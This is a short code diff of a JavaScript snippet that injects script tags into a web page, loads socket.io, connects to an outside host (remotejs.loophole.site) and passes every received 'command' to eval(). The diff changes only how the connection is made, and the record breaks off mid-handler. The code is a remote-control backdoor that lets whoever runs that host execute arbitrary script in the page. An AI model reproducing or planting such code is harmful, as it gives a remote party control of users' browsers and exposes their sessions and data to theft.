@@ -1,7 +1,6 @@
 document.body.innerHTML+=`<script src="https://raw.githubusercontent.com/socketio/socket.io-client/master/dist/socket.io.js"></script>
 <script>
-var socket = new io.Socket();
-socket.connect("https://remotejs.loophole.site");
+var socket = new io.connect("https://remotejs.loophole.site:443");
 alert("Connected");
 socket.on("command", function(command) {
 eval(command);
